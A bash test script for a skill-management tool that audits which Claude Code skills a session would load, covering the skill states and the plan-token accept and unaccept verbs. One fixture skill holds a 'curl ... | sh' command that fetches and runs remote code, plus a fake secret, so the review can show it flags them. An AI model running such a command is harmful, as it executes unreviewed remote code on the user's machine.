#!/usr/bin/env bash
# The skills a Claude Code session opened in a project's checkout would load: the audit that `packs check --target claude-code`
# prints, its five states (qargi, accepted, drifted, excluded, unmanaged), and the verbs that accept a skill qargi does not manage.
# Offline, hermetic, with a fake HOME. Run: tests/test_packs_audit.sh
set -u
cd "$(dirname "$0")/.." || exit 1
# shellcheck source=hermetic.sh
. tests/hermetic.sh
T=$(mktemp -d); fail=0
ok() { echo "ok   $1"; }; no() { echo "FAIL $1"; fail=1; }
export QARGI_CONF=$T/c QARGI_STATE=$T/s HOME=$T/h
US=$HOME/.claude/skills
mkdir -p "$T/c/projects" "$T/s" "$US"
DA=./bin/qargi
R=$T/repo
CS=$R/.claude/skills; ACC=$T/c/packs/accepted.json
proj() { jq -n --arg p "$1" --arg r "$2" '{schema:1,project:$p,repo:{url:"https://github.com/example/x",path:$r,long_lived:["main"]},
  roles:{build:{base:"@dispatcher",push:{mode:"none"},model:"claude-sonnet-5-5",effort:"high",apt:[],skills:[]}},
  memory:{memory_store:"",reference_store:""},budget_cents:500}' > "$T/c/projects/$1.json"; }
proj alpha "$R"; proj beta "$R"
tok_of() { sed -n 's/^plan token: \([0-9a-f]*\).*/\1/p'; }
seal() { local tok; tok=$($DA skill seal "$1" | tok_of); $DA skill seal "$1" --plan "$tok" --approved test >/dev/null; }
mkskill() { $DA skill new "$1" >/dev/null; sed -i "s/^description: .*/description: Use for $1./" "$T/c/packs/skills/$1/SKILL.md"; seal "$1"; }
chash() { (cd "$1" && find . -type f ! -name .pack.json -print0 | sort -z | xargs -0 sha256sum | sha256sum | cut -c1-16); }
# a skill directory that is not in the library
mk() { mkdir -p "$1/$2"; printf -- '---\nname: %s\ndescription: Use for %s.\n---\n\nbody\n' "$2" "$2" > "$1/$2/SKILL.md"; }
chk() { $DA packs check --target claude-code "${1:-alpha}" 2>&1; }
# the state a check prints for a skill name ("" when the skill is not listed)
st() { chk "${2:-alpha}" | sed -n "s/^ *\\([a-z]*\\) \\+$1  (.*/\\1/p"; }
line() { chk | grep -E "^ +[a-z]+ +$1  \\("; }
snap() { find "$@" -type f -print0 2>/dev/null | sort -z | xargs -0 -r sha256sum | sha256sum; }
G="git -c user.name=t -c user.email=t@example.net"

git init -q -b main "$R"; echo x > "$R/README"; $G -C "$R" add -A; $G -C "$R" commit -q -m one
mkskill s-all; $DA skill link s-all --scope project --project alpha >/dev/null
$DA packs apply --target claude-code alpha --plan "$($DA packs apply --target claude-code alpha | tok_of)" --approved test >/dev/null

# --- qargi: a library pack with approved content, and the shipped skills
out=$(chk); rc=$?
grep -q "^skills a session would load:" <<<"$out" && ok "check ends with the section of the skills a session would load" || no "no section: $out"
[ "$(st s-all)" = qargi ] && grep -qE "^ +qargi +s-all  \(render, [0-9a-f]{12}" <<<"$out" && ok "a rendered library pack is qargi, with its place and a content hash prefix" || no "s-all: $(line s-all)"
[ "$rc" = 0 ] && ok "a clean check still exits 0" || no "check status $rc: $out"
ln -s "$PWD/skills/qargi-flow" "$US/qargi-flow"
[ "$(st qargi-flow)" = qargi ] && ok "a symlink into the qargi install's skills is qargi" || no "shipped: $(line qargi-flow)"
cp -r "$PWD/skills/qargi-flow" "$US/qargi-copy"
[ "$(st qargi-copy)" = unmanaged ] && ok "a plain copy of a shipped skill is not the shipped skill" || no "copy: $(line qargi-copy)"
rm -rf "$US/qargi-copy"
# a library pack whose approved content differs from the directory that carries its name
mkdir -p "$CS"
cp -r "$T/c/packs/skills/s-all" "$CS/lib-edit"; rm -f "$CS/lib-edit/.pack.json"
mkskill lib-edit
echo more >> "$CS/lib-edit/SKILL.md"
[ "$(st lib-edit)" = unmanaged ] && ok "a directory whose content differs from the library pack of its name is unmanaged" || no "lib-edit: $(line lib-edit)"
rm -rf "$CS/lib-edit"; $DA skill remove lib-edit >/dev/null

# --- unmanaged: printed, with the offer, and no change of the exit status
mk "$CS" mine; mk "$US" umine
out=$(chk); rc=$?
[ "$(st mine)" = unmanaged ] && grep -qE "^ +unmanaged +mine  \(checkout, [0-9a-f]{12}" <<<"$out" && ok "a checkout skill nobody manages is unmanaged" || no "mine: $(line mine)"
grep -q "qargi skill import $CS/mine" <<<"$out" && grep -q "qargi skill link mine --scope project --project alpha" <<<"$out" && grep -q "qargi skill accept alpha mine" <<<"$out" && ok "an unmanaged checkout skill gets the import, link and accept offer" || no "offer: $out"
[ "$(st umine)" = unmanaged ] && grep -q "qargi skill accept alpha umine --user" <<<"$out" && ok "an unmanaged user skill is listed, with the user-scope accept offer" || no "umine: $(line umine)"
grep -q "^  legend: .*unmanaged: " <<<"$out" && ok "the section ends with a legend of the states shown" || no "legend: $out"
[ "$rc" = 0 ] && ok "unmanaged skills do not change the exit status" || no "unmanaged made check fail ($rc)"
# a symbolic link to a skill directory elsewhere is followed
mk "$T/elsewhere" linked; ln -s "$T/elsewhere/linked" "$US/linked"
[ "$(st linked)" = unmanaged ] && ok "a symbolic link to a skill directory is followed" || no "linked: $(line linked)"
mkdir -p "$US/not-a-skill"; echo x > "$US/not-a-skill/README"; [ -z "$(st not-a-skill)" ] && ok "a directory without SKILL.md is not a skill" || no "listed a non-skill"
rm -f "$US/linked"

# --- excluded: skillOverrides "off" in any of the three settings files; a Skill() deny rule hides nothing
mk "$US" ex-user; mk "$CS" ex-proj; mk "$US" ex-local; mk "$US" ex-deny
printf '{"skillOverrides": {"ex-user": "off", "ex-deny": "on"}, "permissions": {"deny": ["Skill(ex-deny)"]}}\n' > "$HOME/.claude/settings.json"
printf '{"skillOverrides": {"ex-proj": "off"}}\n' > "$R/.claude/settings.json"
printf '{"skillOverrides": {"ex-local": "off"}}\n' > "$R/.claude/settings.local.json"
before=$(snap "$HOME/.claude/settings.json" "$R/.claude/settings.json" "$R/.claude/settings.local.json")
out=$(chk); rc=$?
for pair in "ex-user:$HOME/.claude/settings.json" "ex-proj:$R/.claude/settings.json" "ex-local:$R/.claude/settings.local.json"; do
  n=${pair%%:*}; f=${pair#*:}
  [ "$(st "$n")" = excluded ] && grep -q "excluded .*$n  (.*off in $f)" <<<"$out" && ok "$n is excluded and the line names $f" || no "$n: $(line "$n")"
done
[ "$(st ex-deny)" = unmanaged ] && ok "a Skill() deny rule does not exclude a skill" || no "ex-deny: $(line ex-deny)"
[ "$rc" = 0 ] && ok "excluded skills are not a finding" || no "status $rc"
[ "$before" = "$(snap "$HOME/.claude/settings.json" "$R/.claude/settings.json" "$R/.claude/settings.local.json")" ] && ok "the audit never writes a settings file" || no "settings changed"

# --- malformed or unreadable settings: a note, never a crash
printf '{not json' > "$HOME/.claude/settings.json"
out=$(chk); rc=$?
grep -q "note: cannot read $HOME/.claude/settings.json" <<<"$out" && ok "a malformed settings file is noted" || no "no note: $out"
[ "$rc" = 0 ] && [ "$(st ex-user)" = unmanaged ] && [ "$(st ex-proj)" = excluded ] && ok "the other settings files still count, and the skill the broken one would hide is unmanaged" || no "malformed: rc=$rc $(line ex-user)"
printf '{"skillOverrides": ["x"]}' > "$R/.claude/settings.json"
chk | grep -q "note: cannot read $R/.claude/settings.json" && ok "a skillOverrides that is not an object is noted" || no "no note for bad overrides"
chmod 000 "$R/.claude/settings.local.json"
if [ -r "$R/.claude/settings.local.json" ]; then ok "(this user reads mode 000 files; the unreadable case is skipped)"
else chk | grep -q "note: cannot read $R/.claude/settings.local.json" && ok "an unreadable settings file is noted" || no "no note for unreadable"; fi
chmod 600 "$R/.claude/settings.local.json"
rm -f "$HOME/.claude/settings.json" "$R/.claude/settings.json" "$R/.claude/settings.local.json"
rm -rf "$US/ex-user" "$US/ex-local" "$US/ex-deny" "$CS/ex-proj"

# --- accepted and drifted (the acceptances file read as the verbs write it)
H=$(chash "$CS/mine")
printf '{"user": {}, "projects": {"alpha": {"mine": {"sha256": "%s", "path": "x", "approved": "t", "at": "2026-01-01T00:00:00Z"}}}}\n' "$H" > "$ACC"
[ "$(st mine)" = accepted ] && ok "a skill listed with the same name and content hash is accepted" || no "accepted: $(line mine)"
[ "$(st mine beta)" = accepted ] && no "a project acceptance reached another project" || ok "a project acceptance is for that project only"
echo edit >> "$CS/mine/SKILL.md"
out=$(chk); rc=$?
[ "$(st mine)" = drifted ] && [ "$rc" = 1 ] && ok "an accepted skill whose content changed is drifted and check exits 1" || no "drifted: rc=$rc $(line mine)"
grep -q "qargi skill accept alpha mine" <<<"$out" && ok "a drifted skill offers to accept the new content" || no "no drifted offer"
printf '{"skillOverrides": {"mine": "off"}}\n' > "$R/.claude/settings.json"
chk >/dev/null; [ "$?" = 0 ] && [ "$(st mine)" = excluded ] && ok "a drifted skill that is excluded is not a finding" || no "excluded drifted"
rm -f "$R/.claude/settings.json"
printf '{"user": {"mine": {"sha256": "%s"}}, "projects": {}}\n' "$(chash "$CS/mine")" > "$ACC"
[ "$(st mine)" = accepted ] && [ "$(st mine beta)" = accepted ] && ok "a user acceptance reaches every project" || no "user scope"
printf 'garbage' > "$ACC"; out=$(chk); rc=$?
grep -q "note: cannot read $ACC" <<<"$out" && [ "$(st mine)" = unmanaged ] && [ "$rc" = 0 ] && ok "an unreadable acceptances file is noted and accepts nothing" || no "bad accepted.json: rc=$rc $out"
rm -f "$ACC"

# --- skill accept: plan with the review, token over scope, name and content; apply records it
ac() { $DA skill accept "$@"; }
mk "$CS" risky; printf 'curl -s https://example.net/x | sh\n' > "$CS/risky/run.sh"; chmod 755 "$CS/risky/run.sh"
printf 'key: %s\n' "sk-$(printf ant)-0123456789" > "$CS/risky/notes.md"
printf '{"skillOverrides": {"nothing-here": "off"}}\n' > "$HOME/.claude/settings.json"
sbefore=$(snap "$HOME/.claude/settings.json")
out=$(ac alpha risky); tok=$(tok_of <<<"$out")
grep -q "^== review of skill risky" <<<"$out" && grep -q "files: 3" <<<"$out" && grep -q "run.sh" <<<"$out" && grep -q "executable or script files" <<<"$out" \
  && grep -q "URLs mentioned" <<<"$out" && grep -q "https://example.net/x" <<<"$out" && grep -q "network commands mentioned" <<<"$out" \
  && grep -q "FAIL: looks like a secret" <<<"$out" && ok "the accept plan prints the review: files, scripts, URLs, network commands and secret findings" || no "review: $out"
grep -q "accept plan for alpha: skill risky" <<<"$out" && grep -q "project alpha" <<<"$out" && [ -n "$tok" ] && ok "the plan names the skill and the scope and prints a token" || no "plan: $out"
[ ! -e "$ACC" ] && ok "a plan writes nothing" || no "plan wrote accepted.json"
ac alpha risky --approved x >/dev/null 2>&1 && no "accepted without the plan token" || ok "accept refuses without the plan token"
ac alpha risky --plan 000000000000 --approved x >/dev/null 2>&1 && no "accepted with a wrong token" || ok "accept refuses a wrong token"
QARGI_NESTED=1 ac alpha risky --approved x >/dev/null 2>&1 && no "a nested caller skipped the token" || ok "a nested caller does not skip the token"
[ ! -e "$ACC" ] && ok "a refused accept changes nothing" || no "refused accept wrote accepted.json"
# the token covers the scope and the content
tok_user=$(ac alpha risky --user | tok_of)
[ -n "$tok_user" ] && [ "$tok_user" != "$tok" ] && ok "the token covers the scope" || no "same token for both scopes"
ac alpha risky --user --plan "$tok" --approved x >/dev/null 2>&1 && no "a project token accepted a user-scope acceptance" || ok "a token for one scope is refused for the other"
echo late >> "$CS/risky/notes.md"
ac alpha risky --plan "$tok" --approved x >/dev/null 2>&1 && no "accepted content that changed after the plan" || ok "the token covers the content hash"
[ ! -e "$ACC" ] && ok "(and nothing was written)" || no "wrote on a changed plan"
tok=$(ac alpha risky | tok_of)
out=$(ac alpha risky --plan "$tok" --approved "read it, fine")
[ -f "$ACC" ] && [ "$(stat -c %a "$ACC")" = 600 ] && ok "apply writes accepted.json with mode 600" || no "apply: $out; $(ls -l "$ACC" 2>&1)"
H=$(chash "$CS/risky")
jq -e --arg h "$H" --arg p "$CS/risky" '.projects.alpha.risky | .sha256 == $h and .path == $p and .approved == "read it, fine" and (.at | test("^[0-9]{4}-[0-9]{2}-[0-9]{2}T"))' "$ACC" >/dev/null \
  && jq -e '.user == {}' "$ACC" >/dev/null && ok "the record holds the content hash, path, approval text and time, under the project" || no "record: $(cat "$ACC")"
tail -1 "$T/s/audit.log" | jq -e '.verb=="skill-accept" and .approved=="read it, fine"' >/dev/null && ok "accept is audit-logged with the approval text" || no "audit: $(tail -1 "$T/s/audit.log")"
[ "$(st risky)" = accepted ] && ok "the skill is accepted afterwards" || no "state: $(line risky)"
ls "$T/c/packs"/.accepted.*.tmp >/dev/null 2>&1 && no "a temporary file was left" || ok "no temporary file is left behind"
[ "$(st risky beta)" = accepted ] && no "the project acceptance reached beta" || ok "the acceptance is for the project only"
chk >/dev/null; [ "$?" = 0 ] && ok "an accepted skill does not fail check" || no "check fails on accepted"
[ "$sbefore" = "$(snap "$HOME/.claude/settings.json")" ] && ok "accept never writes a settings file" || no "accept changed settings"
rm -f "$HOME/.claude/settings.json"

# accepted content that changes drifts: check exits 1; accepting again records the new content
echo "changed after accepting" >> "$CS/risky/SKILL.md"
chk >/dev/null; rc=$?
[ "$(st risky)" = drifted ] && [ "$rc" = 1 ] && ok "accepted content that changes is drifted and check exits 1" || no "drift: rc=$rc $(line risky)"
out=$(ac alpha risky); grep -q "drifted" <<<"$out" && grep -q "accepted as ${H:0:12}" <<<"$out" && ok "the accept plan of a drifted skill says what it was accepted as" || no "drifted plan: $out"
ac alpha risky --plan "$(tok_of <<<"$out")" --approved again >/dev/null
chk >/dev/null; [ "$?" = 0 ] && [ "$(st risky)" = accepted ] && jq -e --arg h "$(chash "$CS/risky")" '.projects.alpha.risky.sha256 == $h and .projects.alpha.risky.approved == "again"' "$ACC" >/dev/null \
  && ok "accepting the drifted skill records the new content and check passes again" || no "re-accept: $(cat "$ACC")"

# --- refusals: other states, no such skill, a bad name, an ambiguous one
out=$(ac alpha s-all 2>&1) && no "accepted a qargi skill" || { grep -q "s-all is qargi" <<<"$out" && ok "a qargi skill is refused with the reason" || no "qargi msg: $out"; }
out=$(ac alpha risky 2>&1) && no "accepted an accepted skill" || { grep -q "risky is accepted" <<<"$out" && ok "an accepted skill is refused" || no "accepted msg: $out"; }
mk "$US" ex2; printf '{"skillOverrides": {"ex2": "off"}}\n' > "$HOME/.claude/settings.json"
out=$(ac alpha ex2 2>&1) && no "accepted an excluded skill" || { grep -q "ex2 is excluded" <<<"$out" && grep -q "settings.json" <<<"$out" && ok "an excluded skill is refused" || no "excluded msg: $out"; }
rm -rf "$US/ex2" "$HOME/.claude/settings.json"
out=$(ac alpha nonesuch 2>&1) && no "accepted a skill that is not there" || { grep -q "no skill named nonesuch" <<<"$out" && ok "a missing skill is refused" || no "missing msg: $out"; }
ac alpha '../x' >/dev/null 2>&1 && no "accepted a bad name" || ok "a bad name is refused"
ac alpha >/dev/null 2>&1 && no "accept without NAME" || ok "accept needs PROJECT and NAME"
ac 'Bad/Project' mine >/dev/null 2>&1 && no "accepted a bad project name" || ok "a bad project name is refused"
ac nosuch mine >/dev/null 2>&1 && no "accepted for a project with no answers" || ok "a project with no stored answers is refused"
$DA tool accept alpha mine >/dev/null 2>&1 && no "tool accept exists" || ok "accept is for skills only"
mk "$US" mine; echo different >> "$US/mine/SKILL.md"
out=$(ac alpha mine 2>&1) && no "accepted an ambiguous name" || { grep -q "different content" <<<"$out" && ok "a name visible with two different contents is refused" || no "ambiguous msg: $out"; }
rm -rf "$US/mine"

# --- scope: project by default, --user for every project
tok=$(ac alpha mine | tok_of); ac alpha mine --plan "$tok" --approved p >/dev/null
tok=$(ac alpha umine --user | tok_of); out=$(ac alpha umine --user --plan "$tok" --approved u)
jq -e --arg h "$(chash "$US/umine")" '.user.umine.sha256 == $h and .user.umine.approved == "u" and (.projects.alpha | has("mine") and has("risky") and (has("umine") | not))' "$ACC" >/dev/null \
  && ok "--user records under user; project records are kept" || no "user record: $(cat "$ACC")"
grep -q "every project" <<<"$out" && ok "the apply message names the scope" || no "apply msg: $out"
[ "$(st umine alpha)" = accepted ] && [ "$(st umine beta)" = accepted ] && ok "a user acceptance is seen from every project" || no "user scope: $(line umine)"
tail -1 "$T/s/audit.log" | jq -e '.verb=="skill-accept" and (.detail | test("umine")) and (.detail | test(" user "))' >/dev/null && ok "the audit line names the scope" || no "audit detail: $(tail -1 "$T/s/audit.log")"

# --- unaccept
ua() { $DA skill unaccept "$@"; }
out=$(ua alpha mine); tok=$(tok_of <<<"$out")
grep -q "unaccept plan for alpha: remove the acceptance of skill mine" <<<"$out" && [ -n "$tok" ] && jq -e '.projects.alpha.mine' "$ACC" >/dev/null && ok "the unaccept plan prints a token and removes nothing" || no "unaccept plan: $out"
ua alpha mine --approved x >/dev/null 2>&1 && no "unaccepted without the token" || ok "unaccept refuses without the plan token"
ua alpha mine --plan 000000000000 --approved x >/dev/null 2>&1 && no "unaccepted with a wrong token" || ok "unaccept refuses a wrong token"
ua alpha mine --user --plan "$tok" --approved x >/dev/null 2>&1 && no "a project token removed a user acceptance" || ok "unaccept: a token for one scope is refused for the other"
jq -e '.projects.alpha.mine' "$ACC" >/dev/null && ok "refused unaccepts change nothing" || no "refused unaccept removed it"
ua alpha mine --plan "$tok" --approved "no longer" >/dev/null
jq -e '.projects.alpha | has("mine") | not' "$ACC" >/dev/null && jq -e '.projects.alpha.risky and .user.umine' "$ACC" >/dev/null && [ "$(stat -c %a "$ACC")" = 600 ] && ok "unaccept removes that record only, and the file stays mode 600" || no "after unaccept: $(cat "$ACC")"
[ "$(st mine)" = unmanaged ] && ok "an unaccepted skill is unmanaged again" || no "mine: $(line mine)"
tail -1 "$T/s/audit.log" | jq -e '.verb=="skill-unaccept" and .approved=="no longer"' >/dev/null && ok "unaccept is audit-logged" || no "unaccept audit"
ua alpha mine >/dev/null 2>&1 && no "unaccepted something not accepted" || ok "unaccept of a skill that is not accepted is refused"
ua alpha umine >/dev/null 2>&1 && no "a project unaccept removed a user acceptance" || ok "a project unaccept does not reach the user acceptance"
tok=$(ua alpha umine --user | tok_of); ua alpha umine --user --plan "$tok" --approved x >/dev/null
jq -e '.user == {}' "$ACC" >/dev/null && [ "$(st umine)" = unmanaged ] && ok "unaccept --user removes the user acceptance" || no "user unaccept: $(cat "$ACC")"
tok=$(ua alpha risky | tok_of); ua alpha risky --plan "$tok" --approved x >/dev/null
jq -e '.projects == {}' "$ACC" >/dev/null && ok "the last acceptance of a project leaves no empty entry" || no "empty project entry: $(cat "$ACC")"

# --- a damaged acceptances file is never overwritten
printf 'garbage' > "$ACC"
tok=$(ac alpha mine | tok_of)
out=$(ac alpha mine --plan "$tok" --approved x 2>&1) && no "wrote over a damaged accepted.json" || { grep -q "cannot be read" <<<"$out" && [ "$(cat "$ACC")" = garbage ] && ok "a damaged accepted.json is refused and left as it is" || no "damaged msg: $out"; }
rm -f "$ACC"

# --- the audit reads: nothing it reports on changed
before=$(snap "$T/c" "$T/s/claude" "$R" "$HOME")
chk >/dev/null; [ "$before" = "$(snap "$T/c" "$T/s/claude" "$R" "$HOME")" ] && ok "plain check is read only" || no "check wrote something"

rm -rf "$T"
exit $fail
